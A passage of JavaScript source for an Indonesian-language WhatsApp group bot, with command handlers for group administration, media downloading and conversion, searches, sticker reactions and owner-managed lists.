var { img } = await generateProfilePicture(mediz)
await NFSBotInc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcNFS(`Success`)
} else {
var memeg = await NFSBotInc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcNFS(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
    await NFSBotInc.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!NFSTheCreator) return NFSStickOwner()
    await NFSBotInc.removeProfilePicture(NFSBotInc.user.id)
    replygcNFS(`Berhasil menghapus gambar profil bot`)
    }
    break
case 'promote': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NFSBotInc.groupParticipantsUpdate(m.chat, [users], 'promote')
await replygcNFS(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NFSBotInc.groupParticipantsUpdate(m.chat, [users], 'demote')
await replygcNFS(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
NFSBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'totag': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
               if (!m.quoted) return replygcNFS(`Balas pesan dengan teks ${prefix + command}`)
               NFSBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return NFSStickGroup()
if (!isAdmins && !NFSTheCreator) return NFSStickAdmin()
if (!isBotAdmins) return NFSStickBotAdmin()
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tandai Semua ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tag :*  @${me.split('@')[0]}
 🌿 *Pesan : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
NFSBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcNFS(`Kirim/balas teks dengan teks ${prefix + command}`)
NFSStickWait()
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcNFS(eb)
}
break
case 'dbinary': {
if (!q) return replygcNFS(`Kirim/balas teks dengan teks ${prefix + command}`)
NFSStickWait()
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcNFS(db)
}
break
case 'remini': {
			if (!quoted) return replygcNFS(`Dimana gambarnya?`)
			if (!/image/.test(mime)) return replygcNFS(`Kirim / Balas Foto Dengan Teks ${prefix + command}`)
			NFSStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			NFSBotInc.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'gimage': {
                if (!text) return replygcNFS(`*Contoh :* ${prefix + command} carry minati`)
                NFSStickWait()
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    NFSBotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                })
            }
            case 'gimage': {

       if (!text) return replygcNFS(`Contoh : ${prefix + command} kaori cicak`
)
        NFSezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)

        n = NFSezyanu.result

        images = n[Math.floor(Math.random() * n.length)]


                NFSBotInc.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
        }

        break
			case 'mediafire': {
	if (args.length == 0) return replygcNFS(`Di mana tautannya ?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcNFS(`Tautan yang Anda berikan tidak valid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return replygcNFS('Ups, file terlalu besar...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Nama* : ${baby1[0].nama}
*❖ Ukuran* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replygcNFS(`${result4}`)
NFSBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'tiktokvideo':{ 
if (!text) return replygcNFS( `*Contoh :* ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcNFS(`Link Invalid!!`)
NFSStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
NFSBotInc.sendMessage(m.chat, { caption: `Ini dia!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!text) return replygcNFS( `*Contoh :* ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcNFS(`Link Invalid!!`)
NFSStickWait()
require('./lib/tiktok').Tiktok(q).then( data => {
NFSBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replygcNFS(`*Contoh :* ${prefix + command} ${botname}`)
NFSStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Penelusuran Dari : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Judul* : ${g.title}\n`
teks += `⭔ *Keterangan* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcNFS(teks)
})
}
break
case 'happymod':{
if (!q) return replygcNFS(`*Contoh :* ${prefix+command} Sufway surfer mod`)
NFSStickWait()
let kat = await scp1.happymod(q)
replygcNFS(util.format(kat))
}
break
case 'search':
case 'yts': case 'ytsearch': {
                if (!text) return replygcNFS(`*Contoh :* ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'Pencarian YouTube\n\n Hasil dari '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} no : ${no++}\n${themeemoji} Jenis : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Judul : ${i.title}\n${themeemoji} Tampilan : ${i.views}\n${themeemoji} Durasi : ${i.timestamp}\n${themeemoji} Diunggah : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                NFSBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'xxxxplay':{
if (!text) return replygcNFS(`*Contoh :* ${prefix+command} story wa anime`)
NFSStickWait()
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Judul : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Salin tautan di atas dan ketik tautan .ytmp3 untuk audio dan tautan .ytmp4 untuk video`
NFSBotInc.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
case 'play':  case 'song': {
if (!text) return replygcNFS(`*Contoh* : ${prefix + command} Sido Rondo`)
const NFSplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await NFSplaymp3.mp3(anup3k.url)
await NFSBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const NFSaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !NFSaudp3.isYTUrl(text)) return replygcNFS(`Mana link youtube nya?\n\n*Contoh* : ${prefix + command} https://youtube.com/shorts/aTi_on08OuM?feature=share3`)
const audio=await NFSaudp3.mp3(text)
await NFSBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const NFSvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !NFSvidoh.isYTUrl(text)) return replygcNFS(`Mana link youtube nya?\n\n*Contoh* : ${prefix + command} https://youtube.com/shorts/aTi_on08OuM?feature=share3 128kbps`)
const vid=await NFSvidoh.mp4(text)
const ytc=`
*${themeemoji}Judul:* ${vid.title}
*${themeemoji}Tanggal:* ${vid.date}
*${themeemoji}Durasi:* ${vid.duration}
*${themeemoji}Kualitas:* ${vid.quality}`
await NFSBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replygcNFS('Masukkan tautan!!!')
NFSStickWait()
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replygcNFS('Masukkan tautan!!!')
NFSStickWait()
downloadMp3(text)
}
break  
case 'getcase':
if (!NFSTheCreator) return NFSStickOwner()
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("./lib/NFS.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcNFS(`${getCase(q)}`)
break
case 'addprem':
if (!NFSTheCreator) return NFSStickOwner()
if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n\n*Contoh* ${prefix+command} 6281779122444`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await NFSBotInc.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcNFS(`Masukkan nomor yang valid dan terdaftar di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcNFS(`Nomor ${prrkek} Telah Di Masukan Ke Daftar Premium!`)
break
case 'delprem':
if (!NFSTheCreator) return NFSStickOwner()
if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n\n*Contoh* ${prefix+command} 6281779122444`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcNFS(`Nomor ${ya} Telah Di Hapus Dari Daftar Premium!`)
break
case 'addbadword':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Apa katanya?')
if (BadNFS.includes(q)) return replygcNFS("Kata itu sudah digunakan")
BadNFS.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNFS))
replygcNFS(`Sukses Menambahkan Kata Buruk\nPeriksa dengan mengetik ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Masukkan kata')
if (!BadNFS.includes(q)) return replygcNFS("Kata itu tidak ada di database")
let wanu = BadNFS.indexOf(q)
BadNFS.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNFS))
replygcNFS(`Berhasil menghapus kata-kata buruk ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadNFS) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Jumlah : ${BadNFS.length}*`
replygcNFS(teks)
}
break
case 'addvideo':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Apa nama videonya?')
if (VideoNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
VideoNFS.push(q)
await fsx.copy(delb, `./NFSMedia/video/${q}.mp4`)
fs.writeFileSync('./NFSMedia/database/NFSvideo.json', JSON.stringify(VideoNFS))
fs.unlinkSync(delb)
replygcNFS(`Berhasil Menambahkan Video\nPeriksa dengan mengetik ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Masukkan nama video')
if (!VideoNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
let wanu = VideoNFS.indexOf(q)
VideoNFS.splice(wanu, 1)
fs.writeFileSync('./NFSMedia/database/NFSvideo.json', JSON.stringify(VideoNFS))
fs.unlinkSync(`./NFSMedia/video/${q}.mp4`)
replygcNFS(`Berhasil menghapus video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoNFS) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Jumlah : ${VideoNFS.length}*`
replygcNFS(teks)
}
break
case 'addimage':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Apa nama gambarnya?')
if (ImageNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
ImageNFS.push(q)
await fsx.copy(delb, `./NFSMedia/image/${q}.jpg`)
fs.writeFileSync('./NFSMedia/database/NFSimage.json', JSON.stringify(ImageNFS))
fs.unlinkSync(delb)
replygcNFS(`Berhasil Menambahkan Gambar\nPeriksa dengan mengetik ${prefix}listimage`)
}
break
case 'delimage':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Masukkan nama gambar')
if (!ImageNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
let wanu = ImageNFS.indexOf(q)
ImageNFS.splice(wanu, 1)
fs.writeFileSync('./NFSMedia/database/NFSimage.json', JSON.stringify(ImageNFS))
fs.unlinkSync(`./NFSMedia/image/${q}.jpg`)
replygcNFS(`Berhasil menghapus gambar ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNFS) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Jumlah : ${ImageNFS.length}*`
replygcNFS(teks)
}
break
case 'addsticker':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Apa nama stikernya?')
if (StickerNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
StickerNFS.push(q)
await fsx.copy(delb, `./NFSMedia/sticker/${q}.webp`)
fs.writeFileSync('./NFSMedia/database/NFSsticker.json', JSON.stringify(StickerNFS))
fs.unlinkSync(delb)
replygcNFS(`Sukses Menambahkan Stiker\nPeriksa dengan mengetik ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Masukkan nama stiker')
if (!StickerNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
let wanu = StickerNFS.indexOf(q)
StickerNFS.splice(wanu, 1)
fs.writeFileSync('./NFSMedia/database/NFSsticker.json', JSON.stringify(StickerNFS))
fs.unlinkSync(`./NFSMedia/sticker/${q}.webp`)
replygcNFS(`Berhasil menghapus stiker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerNFS) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Jumlah : ${StickerNFS.length}*`
replygcNFS(teks)
}
break
case 'addvn':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Nama audionya apa?')
if (VoiceNoteNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteNFS.push(q)
await fsx.copy(delb, `./NFSMedia/audio/${q}.mp3`)
fs.writeFileSync('./NFSMedia/database/NFSvn.json', JSON.stringify(VoiceNoteNFS))
fs.unlinkSync(delb)
replygcNFS(`Berhasil Menambahkan Audio\nPeriksa dengan mengetik ${prefix}listvn`)
}
break
case 'delvn':{
if (!NFSTheCreator) return NFSStickOwner()
if (args.length < 1) return replygcNFS('Masukkan nama audionya')
if (!VoiceNoteNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
let wanu = VoiceNoteNFS.indexOf(q)
VoiceNoteNFS.splice(wanu, 1)
fs.writeFileSync('./NFSMedia/database/NFSvn.json', JSON.stringify(VoiceNoteNFS))
fs.unlinkSync(`./NFSMedia/audio/${q}.mp3`)
replygcNFS(`Berhasil menghapus audio ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteNFS) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Jumlah : ${VoiceNoteNFS.length}*`
replygcNFS(teks)
}
break
case 'addowner':
if (!NFSTheCreator) return NFSStickOwner()
if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n*Contoh* ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await NFSBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcNFS(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcNFS(`Nomor ${bnnd} Telah Menjadi Pemilik!!!`)
break
case 'delowner':
if (!NFSTheCreator) return NFSStickOwner()
if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n*Contoh* ${prefix+command} 6281779122444`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcNFS(`Nomor ini ${ya} Telah dihapus dari daftar pemilik oleh pemilik!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let NFSBotInc of prem) {
teks += `- ${NFSBotInc}\n`
}
teks += `\n*Total : ${prem.length}*`
NFSBotInc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
                if (!m.quoted) return replygcNFS('Balas Pesan!')
                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Tidak ada')
                if (!text) return replygcNFS(`Untuk Apa Perintah?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('Anda tidak memiliki izin untuk mengubah perintah ini')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcNFS(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcNFS(`Tidak ada hash`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcNFS('Anda tidak memiliki izin untuk menghapus perintah ini')             
                delete global.db.sticker[hash]
                replygcNFS(`Selesai!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash Terkunci
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                NFSBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!isCreator) return NFSStickOwner()
                if (!m.quoted) return replygcNFS('Balas Pesan!')
                if (!m.quoted.fileSha256) return replygcNFS('SHA256 Hash Tidak ada')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcNFS('Hash tidak ditemukan di database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcNFS('Selesai!')
            }
            break
case 'addmsg': {
                if (!m.quoted) return replygcNFS('Balas Pesan yang Ingin Anda Simpan Database')
                if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama file`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcNFS(`'${text}' terdaftar dalam daftar pesan`)
                msgs[text.toLowerCase()] = quoted.fakeObj
                replygcNFS(`Berhasil menambahkan pesan dalam daftar pesan sebagai '${text}' Akses dengan ${prefix}getmsg ${text} Lihat daftar Pesan Dengan ${prefix}listmsg`)
            }
            break
case 'getmsg': {
                if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama file\n\nLihat daftar pesan dengan ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' tidak tercantum dalam daftar pesan`)
                NFSBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Nama :* ${i.nama}\n${themeemoji} *Jenis :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcNFS(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcNFS(`'${text}' tidak tercantum dalam daftar pesan`)
		delete msgs[text.toLowerCase()]
		replygcNFS(`Berhasil dihapus '${text}' dari daftar pesan`)
            }
	    break
case 'setexif': {
               if (!NFSTheCreator) return NFSStickOwner()
               if (!text) return replygcNFS(`*Contoh* : ${prefix + command} nama paket|pengarang`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcNFS(`Berhasil diubah menjadi\n\n${themeemoji} Nama paket : ${global.packname}\n${themeemoji} Pengarang : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await NFSBotInc.fetchStatus(who)
    replygcNFS(bio.status)
  } catch {
    if (text) return replygcNFS(`bio pribadi atau Anda belum membalas pesan orang tersebut!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await NFSBotInc.fetchStatus(who)
      replygcNFS(bio.status)
    } catch {
      return replygcNFS(`bio pribadi atau Anda belum membalas pesan orang tersebut!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!NFSTheCreator) return NFSStickOwner()
if (!quoted) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcNFS(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await NFSBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await NFSBotInc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcNFS(`Berhasil`)
} else {
var memeg = await NFSBotInc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcNFS(`Berhasil`)
}
}
break
case 'creategc': case 'creategroup': {
if (!NFSTheCreator) return NFSStickOwner()
if (!args.join(" ")) return replygcNFS(`Gunakan ${prefix+command} Nama Group`)
try {
let cret = await NFSBotInc.groupCreate(args.join(" "), [])
let response = await NFSBotInc.groupInviteCode(cret.id)
teks = `     「 Membuat Group 」

▸ Nama : ${cret.subject}
▸ Pemilik : @${cret.owner.split("@")[0]}
▸ Pembuat : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
NFSBotInc.sendMessage(m.chat, { text:teks, mentions: await NFSBotInc.parseMention(teks)}, {quoted:m})
} catch {
replygcNFS("Error!")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
NFSBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
NFSBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcNFS('Balas ke Stiker')
                if (!/webp/.test(mime)) return replygcNFS(`Balas stiker dengan text *${prefix + command}*`)
                NFSStickWait()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversikan Webp Ke Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
            if (!quoted) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
            NFSStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            NFSBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
            if (!quoted) return replygcNFS(`Kirim/Balas Video/Audio yang Ingin Dikonversi menjadi MP3 Dengan Teks ${prefix + command}`)
            NFSStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            NFSBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${NFSBotInc.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcNFS(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            if (!quoted) return replygcNFS(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            NFSStickWait()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            NFSBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcNFS('Balas video')
                if (!/webp/.test(mime)) return replygcNFS(`Balas stiker dengan Text *${prefix + command}*`)
                NFSStickWait()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await NFSBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversikan Webp Ke Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcNFS('Harap sertakan tautan atau teks!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
